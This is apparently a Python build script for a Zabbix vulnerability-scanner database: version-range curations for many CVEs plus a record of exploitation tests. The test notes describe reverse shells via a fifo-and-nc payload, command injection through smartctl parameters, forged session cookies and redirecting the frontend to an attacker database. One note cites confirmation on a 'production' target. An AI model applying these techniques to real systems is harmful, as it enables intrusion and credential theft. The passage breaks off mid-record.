#!/usr/bin/env python3
"""Build consolidated vulnerability DB for the Zabbix scanner.

Reads research/ artifacts (produced by research agents) and writes db/:
  db/vulns.json         merged vulnerability records (cve + advisory + component)
  db/credentials.json   default/popular credentials
  db/pocs.json          public PoC map
  db/versions.json      version/docker matrix (reference copy)

Canonical record schema (db/vulns.json, "vulnerabilities"):
  id                  str, unique
  kind                "cve" | "advisory" | "component"
  title, type, severity, summary, impact
  affected_versions   [{branch, min, max}]   (kind != component)
  fixed_versions      [str]
  auth                str                    (kind != component)
  component           str                     Zabbix part (frontend/server/proxy/api/...) or stack component
  prerequisites       [str]
  public_poc          {exists,url,notes}
  references          [str]
  aliases             {cve:[], ghsa:[], zbx:[], zba:[]}
  verified_on         [str]
  notes               str

Merging rules:
  - cve_records: taken as-is; GHSA/ZBX ids linking to a CVE (found in advisory
    records) are attached via aliases instead of creating duplicate entries.
  - advisory_records: ZBX/ZBA/GHSA entries kept standalone only when they have
    no CVE partner within the cve set. Reviewed dependency advisories without a
    partner CVE (php-saml/xmlseclibs) stay standalone too.
  - component_records: kept as kind=component; zabbix-part "component" is
    moved to "stack_component", "applies_to_zabbix" preserved.
  - Non-Zabbix misattributions (e.g. CVE-2016-10135) are excluded — tracked in
    research notes, not the DB.
Deterministic: records sorted by id. Idempotent.
"""
from __future__ import annotations

import json
import re
import shutil
import sys
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
from zbxscan.versioning import compare, parse_version  # noqa: E402

RESEARCH = ROOT / "research"
DB = ROOT / "db"

CVE_RE = re.compile(r"CVE-\d{4}-\d+")

# Advisory ids that are REVIEWED dependency advisories with their own content but
# whose partner CVE is a library CVE (not a Zabbix CVE in the cve set). They are
# kept standalone.
STANDALONE_ADVISORY_EXEMPT = {"GHSA-5j8p-438x-rgg5", "GHSA-c4cc-x928-vjw9"}

# Curations: evidence-based corrections applied on top of merged data.
# Every entry MUST carry a source + note; values here are facts from our own
# research artifacts (ZBX tickets, vendor advisories, SonarSource/Snyk writeups).
# Format: id -> {"field": value, ...} plus implicit "notes" append.
CURATIONS: dict[str, dict] = {
    "CVE-2022-23131": {
        "affected_versions": [
            {"branch": "5.4", "min": "5.4.0", "max": "5.4.8"},
            {"branch": "6.0", "min": "6.0.0alpha1", "max": "6.0.0alpha1",
             "notes": "only 6.0.0alpha1; 6.0.0beta1 — fix"},
        ],
        "fixed_versions": ["5.4.9", "6.0.0beta1"],
        "_note": "Curation (correction): ZBX-20350 — Affected ONLY 5.4.0-5.4.8 and 6.0.0alpha1; "
                "fix 5.4.9rc2/6.0.0beta1. Branches 4.0/5.0 (confusion with the ZBX-20383/logback "
                "4.0.37/5.0.19 fixes) and 6.0 before beta1 were previously added in error — "
                "removed. Applicable only when SAML is enabled (non-default).",
    },
    "CVE-2022-23134": {
        "fixed_versions": ["5.4.9", "6.0.0beta2"],
        "_note": "Curation: fix in Jira is 5.4.9rc2; released fix 5.4.9 (SonarSource, TheN00bBuilder PoC).",
    },
    "CVE-2023-32725": {
        "component": "frontend",
        "fixed_versions": ["6.0.22", "6.4.7", "7.0.0a4"],
        "_note": "Curation: ZBX-23854 — URL widget in scheduled reports (frontend, CWE-565), fixes 6.0.22/6.4.7/7.0.0a4 (6.0.22rc1 in Jira); CVSS 9.6.",
    },
    "CVE-2019-17382": {
        "affected_versions": [
            {"branch": "4.4", "min": "4.4.0", "max": "4.4.0"},
        ],
        "fixed_versions": ["4.4.1"],
        "_note": "Curation: no official fixing version in NVD; per Snyk 4.4.0 is vulnerable, fix 4.4.1 (ZBX-16789); Debian backport later.",
    },
    "CVE-2024-22120": {
        "_note": "Note: Zabbix rates it high-privileges (auth=admin), NVD — low; in practice the vector requires a session with access to script.execute and a host. Check permissions against role/host/scripts (0xdf HTB Watcher).",
    },
    # ranges per the audit (research/db_audit.md): critical discrepancies
    "CVE-2022-43515": {
        "affected_versions": [
            {"branch": "5.0", "min": "unknown", "max": "5.0.30rc1", "notes": "max exclusive (fix 5.0.30)"},
            {"branch": "6.2", "min": "unknown", "max": "6.2.5rc1", "notes": "max exclusive (fix 6.2.5)"},
        ],
        "fixed_versions": ["5.0.30", "6.2.5"],
        "_note": "Audit: max=fix rc without exclusive → fixed versions matched; max = fix rc (exclusive).",
    },
    "CVE-2020-15803": {
        "affected_versions": [
            {"branch": "3.0", "min": "unknown", "max": "3.0.32rc1", "notes": "max exclusive (fix 3.0.32)"},
            {"branch": "4.0", "min": "unknown", "max": "4.0.22rc1", "notes": "max exclusive (fix 4.0.22)"},
            {"branch": "5.0", "min": "unknown", "max": "5.0.2rc1", "notes": "max exclusive (fix 5.0.2)"},
        ],
        "fixed_versions": ["3.0.32", "4.0.22", "5.0.2"],
        "_note": "Audit: max=fix rc without exclusive.",
    },
    "CVE-2021-27927": {
        "affected_versions": [
            {"branch": "4.0", "min": "unknown", "max": "4.0.22rc1", "notes": "max exclusive (fix 4.0.22)"},
            {"branch": "5.0", "min": "unknown", "max": "5.0.8rc1", "notes": "max exclusive (fix 5.0.8)"},
        ],
        "fixed_versions": ["4.0.22", "5.0.8"],
        "_note": "Audit: max=fix rc without exclusive.",
    },
    "CVE-2022-35229": {
        "_note": "Audit: 4.0 max='4.0.0' → false negatives 4.0.1-4.0.42; max auto-clamped to the branch fix (4.0.14?).",
    },
    "CVE-2023-29449": {
        "affected_versions": [
            {"branch": "5.0", "min": "unknown", "max": "5.0.31"},
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.13"},
            {"branch": "6.2", "min": "unknown", "max": "6.2.8rc1", "notes": "max exclusive (added per the 6.2.8 rn, ZBX-22587/88/89)"},
            {"branch": "6.4", "min": "6.4.0alpha1", "max": "6.4.0rc1", "notes": "max exclusive"},
        ],
        "_note": "Audit: added the missing 6.2 branch (fix 6.2.8rc1 already in fixed_versions).",
    },
    "CVE-2023-29450": {
        "affected_versions": [
            {"branch": "5.0", "min": "unknown", "max": "5.0.31"},
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.13", "notes": "fix 6.0.14 (CURLOPT_PROTOCOLS, actual code fix; deep_vectors.md)"},
            {"branch": "6.2", "min": "unknown", "max": "6.2.7", "notes": "fix 6.2.8 per comment ([INFERENCE])"},
            {"branch": "6.4", "min": "6.4.0", "max": "6.4.1", "notes": "fix 6.4.2rc1 per Jira"},
        ],
        "_note": "Curation per deep_vectors.md (code): actual bounds 5.0.32/6.0.14/6.2.8/6.4.2rc1; the Jira title (6.0.16rc1) is more conservative than the code — code-verified bounds taken.",
    },
    "CVE-2020-11800": {
        "affected_versions": [
            {"branch": "2.2", "min": "2.2.19", "max": "unknown", "notes": "2.2.19+ after the incomplete CVE-2017-2824 patch; EOL, no fix"},
            {"branch": "3.0", "min": "unknown", "max": "3.0.30", "notes": "max exclusive; fix 3.0.31"},
            {"branch": "3.2", "min": "unknown", "max": "unknown", "notes": "entire branch, EOL"},
        ],
        "fixed_versions": ["3.0.31"],
        "_note": "Curation per deep_vectors.md/vulhub: trapper mechanics (auto-registration ip + command scriptid=1); 3.4+/4.0/5.0 not affected.",
    },
    "CVE-2023-29451": {
        "affected_versions": [
            {"branch": "6.0", "min": "unknown", "max": "6.0.14"},
            {"branch": "6.2", "min": "unknown", "max": "6.2.9rc2", "notes": "max exclusive (added per the 6.2.9 rn, ZBX-22587/88/89)"},
            {"branch": "6.4", "min": "6.4.0alpha1", "max": "6.4.1rc1", "notes": "max exclusive"},
        ],
        "_note": "Audit: added the missing 6.2 branch (fix 6.2.9rc2 already in fixed_versions).",
    },
    # ---- P5 (2026-11): official ranges researched from Jira ZBX + NVD CNA
    # (security@zabbix.com), confirmed against the zabbix_security_advisories.rss RSS ----
    "CVE-2026-23920": {
        "affected_versions": [
            {"branch": "7.0", "min": "7.0.0", "max": "7.0.22", "notes": "max exclusive (fix 7.0.22)"},
            {"branch": "7.2", "min": "7.2.0", "max": "7.2.15", "notes": "max exclusive (fix 7.2.15)"},
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.6", "notes": "max exclusive (fix 7.4.6)"},
        ],
        "fixed_versions": ["7.0.22", "7.2.15", "7.4.6"],
        "component": "server",
        "auth": "user",
        "_note": "Official (ZBX-27639, ZBV-2026-03-24-2, NVD CNA): multiline-regex bypass in "
                 "host/event action script validation → shell command injection on server/proxy. Affected 7.0.0-7.0.21 / "
                 "7.2.0-7.2.14 / 7.4.0-7.4.5.",
    },
    "CVE-2026-23922": {
        "affected_versions": [
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.9", "notes": "max exclusive (fix 7.4.9)"},
        ],
        "fixed_versions": ["7.4.9"],
        "component": "frontend",
        "auth": "superadmin",
        "_note": "Official (ZBX-28067, ZBV-2026-08-18-1): OAuth client secret leak via Token endpoint "
                 "substitution (superadmin). Affected 7.4.0-7.4.8.",
    },
    "CVE-2026-23923": {
        "affected_versions": [
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.7", "notes": "max exclusive (fix 7.4.7)"},
        ],
        "fixed_versions": ["7.4.7"],
        "component": "frontend",
        "auth": "none",
        "_note": "Official (ZBX-27641, ZBV-2026-03-24-4): unauthenticated instantiation of an arbitrary PHP class "
                 "via the frontend validate action (autoloader oracle). Affected 7.4.0-7.4.6. Confirmed on production 7.4.3 "
                 "(reports/zabbix_targets_2026-10-28.md, SA-6) and PoC exploits/cve-2026-23923-validate-oracle.sh.",
    },
    "CVE-2026-23926": {
        "affected_versions": [
            {"branch": "7.0", "min": "7.0.0", "max": "7.0.24", "notes": "max exclusive (fix 7.0.24)"},
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.8", "notes": "max exclusive (fix 7.4.8)"},
        ],
        "fixed_versions": ["7.0.24", "7.4.8"],
        "component": "frontend",
        "auth": "admin",
        "_note": "Official (ZBX-27758, ZBV-2026-05-06-1): stored XSS in the Host navigator widget tooltip via a maintenance "
                 "period (admin, not superadmin). Affected 7.0.0-7.0.23 / 7.4.0-7.4.7.",
    },
    "CVE-2026-23927": {
        "affected_versions": [
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.45", "notes": "max exclusive (fix 6.0.45)"},
            {"branch": "7.0", "min": "7.0.0", "max": "7.0.24", "notes": "max exclusive (fix 7.0.24)"},
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.8", "notes": "max exclusive (fix 7.4.8)"},
        ],
        "fixed_versions": ["6.0.45", "7.0.24", "7.4.8"],
        "component": "agent",
        "auth": "none",
        "_note": "Official (ZBX-27759, ZBV-2026-05-06-2): TNS connection string injection in the Agent 2 Oracle plugin "
                 "(service parameter) → connection to the attacker's server, leak of stored Oracle credentials. "
                 "No Zabbix authentication needed — network access to Agent 2 suffices. Affected 6.0.0-6.0.44 / "
                 "7.0.0-7.0.23 / 7.4.0-7.4.7.",
    },
    "CVE-2026-23929": {
        "affected_versions": [
            {"branch": "6.0", "min": "6.0.44", "max": "6.0.46", "notes": "max exclusive (fix 6.0.46); min = version where searchParamsToObject appeared (vendor git range)"},
            {"branch": "7.0", "min": "7.0.22", "max": "7.0.25", "notes": "max exclusive (fix 7.0.25); min = vendor git range"},
            {"branch": "7.4", "min": "7.4.6", "max": "7.4.9", "notes": "max exclusive (fix 7.4.9); min = vendor git range"},
        ],
        "fixed_versions": ["6.0.46", "7.0.25", "7.4.9"],
        "component": "frontend",
        "auth": "user",
        "_note": "Official (ZBX-28068, ZBV-2026-08-18-2): prototype pollution in searchParamsToObject() → persistent "
                 "XSS in Maps. Bounds from the CNA vendor git ranges (narrower than NVD CPE): introduced 6.0.44/7.0.22/7.4.6, "
                 "last affected 6.0.45/7.0.24/7.4.8.",
    },
    "CVE-2026-23930": {
        "affected_versions": [
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.47", "notes": "max exclusive (fix 6.0.47)"},
            {"branch": "7.0", "min": "7.0.0", "max": "7.0.27", "notes": "max exclusive (fix 7.0.27)"},
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.11", "notes": "max exclusive (fix 7.4.11)"},
        ],
        "fixed_versions": ["6.0.47", "7.0.27", "7.4.11"],
        "component": "frontend",
        "auth": "none",
        "_note": "Official (ZBX-28069, ZBV-2026-08-18-3): unauthenticated frontend DoS via popup.testtriggerexpr "
                 "(CWE-405). The 7.2 branch is NOT affected (EOL, not covered by the advisory). Last affected 6.0.46/7.0.26/7.4.10.",
    },
    "CVE-2026-23931": {
        "affected_versions": [
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.11", "notes": "max exclusive (fix 7.4.11)"},
        ],
        "fixed_versions": ["7.4.11"],
        "component": "frontend",
        "auth": "user",
        "_note": "Official (ZBX-28070, ZBV-2026-08-18-4): enumeration of plaintext user macro values via "
                 "validate.api.exists (CWE-203). 7.4 only (last affected 7.4.10); secret/vault macros not affected.",
    },
    "CVE-2026-23934": {
        "affected_versions": [
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.12", "notes": "max exclusive (fix 7.4.12)"},
        ],
        "fixed_versions": ["7.4.12"],
        "component": "frontend",
        "auth": "user",
        "_note": "Official (ZBX-28072, ZBV-2026-08-18-6): DoS via validate.api.exists (CWE-405), neighbor of CVE-2026-23931, "
                 "fix scheduled for a later patch. 7.4 only (last affected 7.4.11).",
    },
    "CVE-2026-59785": {
        "affected_versions": [
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.48", "notes": "max exclusive (fix 6.0.48)"},
            {"branch": "7.0", "min": "7.0.0", "max": "7.0.29", "notes": "max exclusive (fix 7.0.29)"},
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.13", "notes": "max exclusive (fix 7.4.13)"},
        ],
        "fixed_versions": ["6.0.48", "7.0.29", "7.4.13"],
        "component": "frontend",
        "auth": "user",
        "_note": "Official (ZBX-28195, ZBV-2026-10-05-3, CWE-204): host search (multiselect.get) response discrepancy — "
                 "filtering on non-displayed fields (IPMI/PSK) allows confirming guessed credentials. "
                 "Last affected 6.0.47/7.0.28/7.4.12.",
    },
    "CVE-2026-59788": {
        "affected_versions": [
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.12", "notes": "max exclusive (fix 7.4.12)"},
        ],
        "fixed_versions": ["7.4.12"],
        "component": "frontend",
        "auth": "superadmin",
        "_note": "Official (ZBX-28198, ZBV-2026-10-05-6): stored XSS — the Authorization endpoint email media type is passed "
                 "to window.open() without scheme validation (javascript: URL); delivery via media type import. 7.4 only "
                 "(last affected 7.4.11).",
    },
    "CVE-2025-27231": {
        "affected_versions": [
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.41", "notes": "max exclusive (fix 6.0.41)"},
            {"branch": "7.0", "min": "7.0.0", "max": "7.0.18", "notes": "max exclusive (fix 7.0.18)"},
            {"branch": "7.2", "min": "7.2.0", "max": "7.2.12", "notes": "max exclusive (fix 7.2.12)"},
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.2", "notes": "max exclusive (fix 7.4.2)"},
        ],
        "fixed_versions": ["6.0.41", "7.0.18", "7.2.12", "7.4.2"],
        "component": "frontend",
        "auth": "superadmin",
        "_note": "Official (ZBX-27062, ZBV-2025-10-03-3, CWE-522): LDAP Bind password leak by a superadmin via LDAP Host "
                 "substitution. NOT the OAuth family (unlike its neighbor CVE-2025-27232) and NOT 7.4-only: "
                 "6.0/7.0/7.2/7.4 affected. Last affected 6.0.40/7.0.17/7.2.11/7.4.1.",
    },
    # ---- excluded entries (not vulnerabilities / not applicable) ----
    "CVE-2016-9140": {
        "excluded": True,
        "_note": "EXCLUDED: CVE WITHDRAWN by the CNA (Red Hat, vulnStatus=Rejected in NVD): 'Further investigation showed that "
                 "it was not a security issue'. The vulnerability does not exist; any historical affected data is "
                 "invalid. Matching impossible (affected empty).",
    },
    "ZBX-20349": {
        "excluded": True,
        "_note": "EXCLUDED: ZBX-20349 is NOT a vulnerability but a Log4Shell (CVE-2021-44228) inquiry about the Java Gateway. "
                 "Closed Won't Fix (2024-04-10): Zabbix Java Gateway ships SLF4J/logback 1.2.3, not Apache Log4j 2.x "
                 "— Log4Shell not applicable. The official Zabbix advisory database contains no log4j advisory at all.",
    },
    "CVE-2021-46088": {
        "affected_versions": [
            {"branch": "4.0", "min": "unknown", "max": "4.0.34", "notes": "NVD: affected ≤4.0.34 (inclusive)"},
            {"branch": "4.2", "min": "unknown", "max": "4.2.8", "notes": "NVD: affected ≤4.2.8 (inclusive)"},
            {"branch": "4.4", "min": "unknown", "max": "4.4.10", "notes": "NVD says ≤4.4.11, but 4.4.11 does not exist (last real patch 4.4.10); branch EOL"},
            {"branch": "5.0", "min": "unknown", "max": "5.0.20", "notes": "NVD: affected ≤5.0.20 (inclusive)"},
        ],
        "fixed_versions": ["4.0.35", "4.2.9", "5.0.21"],
        "_note": "Audit (§4): all ranges were unknown/unknown (the record never matched). Filled from NVD: "
                 "Zabbix Admin role → shell scripts (RCE). No fix for 4.4 (branch EOL).",
    },
    "CVE-2022-35230": {
        "affected_versions": [
            {"branch": "4.0", "min": "unknown", "max": "4.0.43rc1", "notes": "max exclusive (fix 4.0.43)"},
            {"branch": "5.0", "min": "unknown", "max": "5.0.25rc1", "notes": "max exclusive (fix 5.0.25); min was erroneously 5.0.25 (inversion)"},
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.5rc1", "notes": "max exclusive (fix 6.0.5)"},
        ],
        "fixed_versions": ["4.0.43", "5.0.25", "6.0.5"],
        "_note": "Audit/repair: only 5.0 was present (5.0.25→5.0.25rc1 — inversion from clamping), misses on 4.0/6.0. "
                 "Branch 6.2 not added (fix 6.2.0rc1 predates the first 6.2 release). Reflected XSS in graphs.",
    },
    "CVE-2016-10742": {
        "affected_versions": [
            {"branch": "2.2", "min": "unknown", "max": "2.2.20"},
            {"branch": "3.0", "min": "3.0.0", "max": "3.0.12"},
            {"branch": "3.1", "min": "3.1.0", "max": "3.1.0", "notes": "unreleased dev branch, degraded to an empty set (audit §3a)"},
            {"branch": "3.3", "min": "3.3.0", "max": "3.3.0", "notes": "unreleased dev branch, degraded to an empty set (audit §3a)"},
        ],
        "_note": "Audit §3a: branches 3.1/3.3 are unreleased (no patches in versions.json); max=unknown → matched the entire phantom branch.",
    },
    "ZBX-16792": {
        "affected_versions": [
            {"branch": "5.0", "min": "unknown", "max": "unknown",
             "notes": "the whole 5.0 branch: max='5.0' was a branch marker (matched almost nothing); the masking fix version is not stated in the advisory"},
        ],
        "_note": "Audit §3a: max='5.0' is a branch marker instead of a patch version. Passwords in Docker container logs; "
                 "the upper bound is unknown — the whole branch (5.0 LTS, potential over-match on patched installs, noted).",
    },
    "CVE-2019-15132": {
        "fixed_versions": ["4.0.27", "4.4.1", "5.0.6", "5.2.2"],
        "_note": "Audit §3a: fixed_versions=['4.2'] was a branch marker. Concretized from the affected bounds "
                 "(≤4.0.26/4.4.0alpha1/≤5.0.5/≤5.2.1 → fixes = the next patch of each branch).",
    },
    # --- Empirical extensions (P6 lab sweep 2026-11-02, docker 4.0.46/5.0.44/6.0.42/7.0.19/7.2.11/7.4.3) ---
    "CVE-2021-46088": {
        "affected_versions": [
            {"branch": "4.0", "min": "unknown", "max": "unknown",
             "notes": "no fix — entire branch (empirically works on 4.0.46)"},
            {"branch": "4.2", "min": "unknown", "max": "unknown",
             "notes": "no fix — entire branch"},
            {"branch": "4.4", "min": "unknown", "max": "unknown",
             "notes": "no fix — entire branch"},
            {"branch": "5.0", "min": "unknown", "max": "unknown",
             "notes": "no fix — entire branch (empirically works on 5.0.44)"},
            {"branch": "5.2", "min": "unknown", "max": "unknown", "notes": "empirically: entire branch (lab 5.2.7 EXPLOITED)"},
            {"branch": "5.4", "min": "unknown", "max": "unknown", "notes": "empirically: entire branch (lab 5.4.8/5.4.12 EXPLOITED)"},
            {"branch": "6.0", "min": "unknown", "max": "unknown", "notes": "empirically: 6.0.27/6.0.31/6.0.49 + lab 6.0.42 — works"},
            {"branch": "6.2", "min": "unknown", "max": "unknown", "notes": "empirically: 6.2.9 EXPLOITED"},
            {"branch": "6.4", "min": "unknown", "max": "unknown", "notes": "empirically: 6.4.21 EXPLOITED"},
            {"branch": "7.0", "min": "unknown", "max": "unknown", "notes": "empirically: lab 7.0.19 — works"},
            {"branch": "7.2", "min": "unknown", "max": "unknown", "notes": "empirically: lab 7.2.11 — works"},
            {"branch": "7.4", "min": "unknown", "max": "unknown", "notes": "empirically: lab 7.4.3 — works"},
        ],
        "_note": "EMPIRICAL EXTENSION (P6 sweep 2026-11-02): the primitive (Admin creates+executes a "
                 "shell script via the API) works on ALL branches 4.0–7.4 (lab: 4.0.46/5.0.44/6.0.42/"
                 "7.0.19/7.2.11/7.4.3 + earlier verifies 5.0.5–6.4.21). No fix in current branches — "
                 "the vendor considers script execution normal behavior for roles with script permissions; treat it "
                 "as privilege-hygiene (Admin != RCE by default), not a classic RCE.",
    },
    "CVE-2024-36460": {
        "affected_versions": [
            {"branch": "5.0", "min": "5.0.0", "max": "5.0.42"},
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.30"},
            {"branch": "6.4", "min": "6.4.0", "max": "6.4.15"},
            {"branch": "7.0", "min": "7.0.0", "max": "unknown",
             "notes": "the official fix 7.0.1 covered the frontend; empirically the auditlog.get API returns passwords on 7.0.19 (lab 2026-11-02) — entire branch"},
            {"branch": "7.2", "min": "unknown", "max": "unknown",
             "notes": "empirically (lab 2026-11-02): auditlog.get returns plaintext passwords on 7.2.11"},
            {"branch": "7.4", "min": "unknown", "max": "unknown",
             "notes": "empirically (lab 2026-11-02): works on 7.4.3"},
        ],
        "_note": "EMPIRICAL EXTENSION (P6 sweep): the API-level auditlog.get returns plaintext passwords "
                 "on 7.2.11 and 7.4.3 outside the official range (the official fix covered the frontend; 6.0.42 clean).",
    },
    "CVE-2024-36464": {
        "affected_versions": [
            {"branch": "4.0", "min": "unknown", "max": "unknown",
             "notes": "empirically (lab 2026-11-02): media type secrets are returned by the API on 4.0.46"},
            {"branch": "6.0", "min": "unknown", "max": "6.0.30rc1", "notes": "max exclusive (fix 6.0.30)"},
            {"branch": "6.4", "min": "6.4.0", "max": "6.4.15rc1", "notes": "max exclusive (fix 6.4.15)"},
        ],
        "_note": "EMPIRICAL EXTENSION (P6 sweep): media type export/API returns the password in plaintext on 4.0.46 "
                 "(outside the official 6.0/6.4). No leak observed on 5.0.44.",
    },
    "CVE-2025-27234": {
        "_note": "EMPIRICAL BOUNDARY (P6, docker bisect 2026-11-02): shell RCE confirmed with touch markers on "
                 "5.0.25/5.0.29/5.0.30/5.0.31/5.0.35/5.0.38; 5.0.39 — smartctl executes but WITHOUT a shell (argv); "
                 "5.0.44 — whitelist ('Invalid characters'); 5.0.10 — smart.disk.get has no parameters yet; "
                 "6.0.42/7.0.19/7.2.11/7.4.3 — argv injection without RCE. The official ZBX-26985 range (up to 5.0.46) "
                 "is kept for the CVE record; for exploitation the RCE boundary = 5.0.x ≤5.0.38.",
    },
    "CVE-2026-23925": {
        "affected_versions": [
            {"branch": "6.0", "min": "6.0.0", "max": "6.0.41",
             "notes": "max exclusive (fix 6.0.41); empirically 6.0.40 VULN / 6.0.41 fix (2026-11-02)"},
            {"branch": "7.0", "min": "7.0.0", "max": "7.0.18",
             "notes": "max exclusive (fix 7.0.18); empirically 7.0.17 VULN / 7.0.18 fix (2026-11-02)"},
            {"branch": "7.2", "min": "7.2.0", "max": "7.2.12",
             "notes": "WIDENING 2026-11-02: 7.2 is absent from advisory ZBX-27567, but empirically "
                      "7.2.11 VULN, the fix silently appeared in 7.2.12. Max exclusive."},
            {"branch": "7.4", "min": "7.4.0", "max": "7.4.2",
             "notes": "max exclusive (fix 7.4.2); empirically 7.4.1 VULN / 7.4.2 fix (2026-11-02)"},
        ],
        "_note": "REFINED PROBE + BOUNDS (2026-11-02, ZBX-27567 cross-checked against Jira): the vector is a User role "
                 "(type 1) with rw on a host group creating a host via configuration.import (import bypasses "
                 "the host-creation role gate; no version writes into a group without permissions — the "
                 "group-perm check works there). Verified bounds (docker, import format per branch): "
                 "6.0.40 VULN / 6.0.41 fix; 7.0.17 VULN / 7.0.18 fix; 7.4.1 VULN / 7.4.2 fix; "
                 "7.2.11 VULN / 7.2.12 fix. Format nuances: 7.x YAML with uuid in host_groups; 6.0 YAML "
                 "without a host_groups section at all; 5.x/4.x — outside the official 6.0+ range (no roles).",
    },
    "CVE-2026-1199": {
        "_note": "P6 empirics (2026-11-02): the absence of brute-force blocking (>5 failures without lockout) also "
                 "on 4.0.46/5.0.44/7.2.11 — this is a missing feature, not the claimed CVE; range not extended.",
    },
    "CVE-2013-3628": {
        "_note": "P6 empirics (2026-11-02): the basic primitive (Admin script-exec via the API) reproduces on "
                 "all current branches (see CVE-2021-46088) — not applicable to the 2.0.9 range.",
    },
}

# Container verification results (db/verifications source of truth). Each entry:
#   id -> [{"version", "result", "when", "conditions", "note"}]
# result: "exploited" | "check-pass" | "blocked" | "negative" | "pending"
VERIFIED: dict[str, list[dict]] = {
    "CVE-2021-46088": [
        {"version": "5.4.8-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds Admin/zabbix (fresh install)",
         "note": "script.create+execute on server container: uid=1997(zabbix). Live docker image zabbix-server-pgsql:5.4.8-alpine."},
        {"version": "6.0.27-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "default creds; three execution modes",
         "note": "--cmd one-shot, --shell persistent (2 commands through session), "
                "--revshell: interactive bash captured (uid=1997(zabbix), bash-5.1$, uname/hostname). "
                "All three modes verified live."},
    ],
    "CVE-2025-27233": [
        {"version": "7.0.10-alpine agent2", "result": "check-pass", "when": "2026-10-28",
         "conditions": "own agent2 container, wrapper around smartctl logs argv",
         "note": "Argument injection proven: smart.disk.get[device,mode] lands verbatim in the "
                 "smartctl argv (-a MARKER -d MARKER) via the verified agent passive protocol "
                 "({\"request\":\"passive checks\",\"data\":[{key,timeout}]}). Primitive confirmed "
                 "live; full ICE impact (NTLMv2/UNC on Windows, RCE flavor on 5.0.x) environment-dependent."},
    ],
    "CVE-2025-27234": [
        {"version": "5.0.46-alpine agent2", "result": "negative", "when": "2026-10-28",
         "conditions": "own live container zlab_agent2_5; raw 5.0 passive protocol "
                       "(ZBXD\\x01+LE64 raw item key); smart.disk.get[device,mode]",
         "note": "RCE flavor NOT reproduced: parameters pass the cleanRegex "
                 "^[a-zA-Z0-9 \\-_/\\\\\\\\.]*$ (clearString, added in 5.0.40, DEV-2701) — all "
                 "shell metacharacters (;,|,&,$(),backticks,quotes,\\n) are rejected with "
                 "ZBX_NOTSUPPORTED 'Invalid characters found in parameter'. The code path is still "
                 "shell-backed (zbxcmd.ExecuteStrict -> exec.Command('sh','-c','sudo -n smartctl <args>'), "
                 "confirmed from the tag 5.0.46 sources) — RCE is only possible on 5.0.0-5.0.39 without the regex; "
                 "5.0.47 was rewritten to the exec array (controller.go, ZBX-23858). Flag injection into the "
                 "smartctl argv works (-V gets through, smartctl version in the output)."},
        {"version": "7.0.10-alpine agent2", "result": "check-pass", "when": "2026-10-28",
         "conditions": "own live container zlab_agent2; JSON passive checks protocol",
         "note": "NO sanitization (parameters verbatim), but the call goes through an exec array "
                 "(exec.CommandContext('sudo','-n',smartctl,args...), controller.go) — no shell, "
                 "argv-only: the flags (-V, -f, -l scttempsts) reach smartctl, no command execution."},
        {"version": "5.0.30-alpine agent2", "result": "exploited", "when": "2026-10-28",
         "conditions": "pre-whitelist build (5.0.0-5.0.39), raw-key passive protocol",
         "note": "smart.disk.get device/mode -> shell-backed smartctl -> the ';cmd;' injection "
                 "executes as zabbix (touch markers /tmp/pwn30* created). Full "
                 "INTERACTIVE SHELL via the fifo+nc payload: 'sh: can't access tty; job control "
                 "turned off; /var/lib/zabbix $ id -> uid=1997(zabbix)'. The 5.0 "
                 "RCE flavor confirmed live."},
        {"version": "5.0.30-alpine agent2 (zbxscan module)", "result": "exploited",
         "when": "2026-10-28",
         "conditions": "module CVE-2025-27234 (agent2.py _session): --agent-port 10061 "
                       "--revshell 172.18.0.1:<port> --cmd 'id; hostname' and --shell REPL",
         "note": "Module: --cmd/--shell confirmed live. The payload is wrapped in "
                 "(setsid sh -c '<fifo+nc chain>' </dev/null >/dev/null 2>&1 &) — it survives "
                 "the plugin kill (~3s 'Timeout while executing a shell script'): --cmd returned "
                 "uid=1997(zabbix) + hostname c54cae9b6230, --shell executed id and hostname "
                 "line by line, exit closed the session. Without setsid the old foreground variant returned "
                 "only the banner (sh died before the command arrived) — the fix is mandatory."},
    ],
    "CVE-2013-3628": [
        {"version": "5.4.8-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "same script-exec technique (shared module, verified through CVE-2021-46088)",
         "note": "post-auth global-script RCE confirmed on 5.4.8."},
    ],
    "CVE-2022-23131": [
        {"version": "5.4.8-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "SAML enabled (config.saml_auth_enabled=1) + dummy IdP + idp.crt",
         "note": "Full chain: forged zbx_session (reused anon sessionid/sign + saml_data.username_attribute=Admin) -> index_sso.php -> Admin session (userid=1) -> script.execute RCE uid=1997(zabbix)."},
        {"version": "5.4.8-alpine", "result": "blocked", "when": "2026-10-28",
         "conditions": "default docker image, SAML disabled",
         "note": "Forge yields a session cookie but login block is skipped (saml_auth_enabled=0) -> no identity. Condition check reflects this (unknown until active attempt)."},
    ],
    "CVE-2022-23134": [
        {"version": "5.4.8-alpine", "result": "exploited", "when": "2026-10-28",
         "conditions": "attacker PostgreSQL on same docker network, schema cloned; DB_TYPE POSTGRESQL, DB_ENCRYPTION=0",
         "note": "Full takeover verified: forged zbx_session {step:6 + DB_host/port/db/user/pass + POSTGRESQL + encryption off} "
                 "-> setup.php stage6 -> zabbix.conf.php rewritten to attacker DB -> login Admin/<attacker-known pass> "
